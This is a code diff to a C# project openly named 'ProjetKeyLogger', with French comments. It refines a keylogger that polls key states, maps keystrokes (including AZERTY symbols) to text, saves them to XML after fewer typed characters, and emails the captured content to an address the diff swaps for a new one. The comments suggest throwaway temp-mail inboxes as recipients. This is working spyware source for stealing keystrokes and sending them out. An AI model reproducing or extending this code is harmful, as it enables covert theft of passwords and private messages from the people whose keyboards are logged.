@@ -71,6 +71,7 @@ namespace ProjetKeyLogger
                     //le statut d'un clé est a 0 si elle n'est pas active et est a 32769 si la touche est appuyée
                     if (statut_cle == 32769)
                     {
+                        string valeurs;
                         switch (codeASCII)
                         {
                             //Si touche Entrée
@@ -82,7 +83,7 @@ namespace ProjetKeyLogger
                                 enregistrement = new Enregistrement();
 
                                 //SI le nombre de caracteres tapés a dépassé la limite
-                                if (nb_caractere_tape > 100)
+                                if (nb_caractere_tape > 30)
                                 {
                                     //On enregistre le contenue en xml
                                     collection_enregistrement.saveToXml(file_path);
@@ -127,7 +128,7 @@ namespace ProjetKeyLogger
 
                             //touche espace
                             case 9:
-                                enregistrement.ajouterContenu(Char.Parse(" "));
+                                enregistrement.ajouterContenu(" ");
                                 break;
 
                             //touche suppr 
@@ -152,20 +153,22 @@ namespace ProjetKeyLogger
                                 {
                                     if (majuscule == false & altgr == false & shift == false)
                                     {
-                                        char[] valeurs = { 'à', '&', 'é', '\"', '\'', '(', '-', 'è', '_', 'ç' };
-                                        enregistrement.ajouterContenu(valeurs[codeASCII - 48]);
+                                        valeurs = "à&é\"'(-è_ç";
+                                        enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 48, 1));
                                     }
                                     else
                                     {
                                         if (altgr == true)
                                         {
-                                            char[] valeurs = { '@', ' ', '~', '#', '{', '[', '|', '`', '\\', '^', '"' };
-                                            enregistrement.ajouterContenu(valeurs[codeASCII - 48]);
+                                            valeurs = "@ ~#{[|`\\^";
+                                            enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 48, 1));
                                             altgr = false;
                                         }
                                         else
                                         {
-                                            enregistrement.ajouterContenu((char)codeASCII);
+                                            valeurs = "0123456789";
+                                            enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 48, 1));
+
                                         }
                                     }
                                 }
@@ -188,8 +191,9 @@ namespace ProjetKeyLogger
                                 }
                                 else
                                 {
-                                    char[] valeurs = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
-                                    enregistrement.ajouterContenu(valeurs[codeASCII - 96]);
+                                    valeurs = "0123456789";
+                                    enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 96, 1));
+
                                 }
                                 break;
 
@@ -205,8 +209,8 @@ namespace ProjetKeyLogger
                                 }
                                 else
                                 {
-                                    char[] valeurs = { '*', '+',' ', '-', '.', '/' };
-                                    enregistrement.ajouterContenu(valeurs[codeASCII - 106]);
+                                    valeurs = "*+ -./";
+                                    enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 106, 1));
                                 }
                                 break;
 
@@ -247,22 +251,22 @@ namespace ProjetKeyLogger
                                 }
                                 else
                                 {
-                                    char[] valeurs = {'$','=',',',' ',';',':','ù','£','+','?','.','/','%','¤','}' };
+                                    valeurs = "$=, ;:ù£+? ./%¤}"; 
                                     if ((majuscule == true | shift == true) & altgr == false)
                                     {
-                                        enregistrement.ajouterContenu(valeurs[codeASCII - 179]);
+                                        enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 179, 1));
                                         shift = false;
                                     }
                                     else
                                     {
                                         if (altgr == true & (codeASCII == 186 | codeASCII == 187))
                                         {
-                                            enregistrement.ajouterContenu(valeurs[codeASCII - 172]);
+                                            enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 172, 1));
                                             altgr = false;
                                         }
                                         else
                                         {
-                                            enregistrement.ajouterContenu(valeurs[codeASCII - 186]);
+                                            enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 186, 1));
                                         }
                                     }
                                 }
@@ -279,21 +283,21 @@ namespace ProjetKeyLogger
                                 }
                                 else
                                 {
-                                    char[] valeurs = { ')', '*', '^', '²', '!', '°', 'µ', '¨', '²', '§' };
+                                    valeurs = ")*^²!°µ¨²§";
                                     if ((majuscule == true | shift == true) & altgr == false)
                                     {
-                                        enregistrement.ajouterContenu(valeurs[codeASCII - 214]);
+                                        enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 214, 1));
                                         shift = false;
                                     }
                                     else
                                     {
                                         if (altgr == true & codeASCII == 219)
                                         {
-                                            enregistrement.ajouterContenu(char.Parse("]"));
+                                            enregistrement.ajouterContenu(("]"));
                                         }
                                         else
                                         {
-                                            enregistrement.ajouterContenu(valeurs[codeASCII - 219]);
+                                            enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 219, 1));
                                         }
                                     }
                                 }
@@ -309,11 +313,11 @@ namespace ProjetKeyLogger
                                 {
                                     if (shift == false)
                                     {
-                                        enregistrement.ajouterContenu(char.Parse("<"));
+                                        enregistrement.ajouterContenu("<");
                                     }
                                     else
                                     {
-                                        enregistrement.ajouterContenu(char.Parse(">"));
+                                        enregistrement.ajouterContenu(">");
                                         shift = false;
                                     }
                                 }
@@ -336,25 +340,22 @@ namespace ProjetKeyLogger
                                 {
                                     if (majuscule == true | shift == true)
                                     {
-                                        enregistrement.ajouterContenu(Char.ToUpper((char)codeASCII));
+                                        
+                                        enregistrement.ajouterContenu(Char.ToUpper((char)codeASCII).ToString());
                                         shift = false;
                                     }
                                     else
                                     {
-                                        enregistrement.ajouterContenu(Char.ToLower((char)codeASCII));
+                                        enregistrement.ajouterContenu(Char.ToLower((char)codeASCII).ToString());
                                     }
                                 }
-                                
-                                //Concatenation e la derniere touche tapée au contenu de l'enregistrement
-                                enregistrement.ajouterContenu((char)codeASCII);
-                                //On incrémente le nombre de caracteres tapé
-                                //!!!A mettre a chaque fois qu'un caractere est tapé!!!
-                                nb_caractere_tape += 1;
                                 break;
                         }
-
                     }
-                   
+                    //On incrémente le nombre de caracteres tapé
+                    //!!!A mettre a chaque fois qu'un caractere est tapé!!!
+                    nb_caractere_tape += 1;
+
                 }
 
             }
@@ -392,7 +393,7 @@ namespace ProjetKeyLogger
             //definition de l'adresse de destination 
             //Création d'un mail temporaire. On peut aussi mettre notre adresse mail!
             //site de création du mail : temp-mail.org
-            message_mail.To.Add("ccamenen@outlook.fr");
+            message_mail.To.Add("tulaurapas35@gmail.com");
 
             //defition de l'objet du mail
             message_mail.Subject = objet_mail;
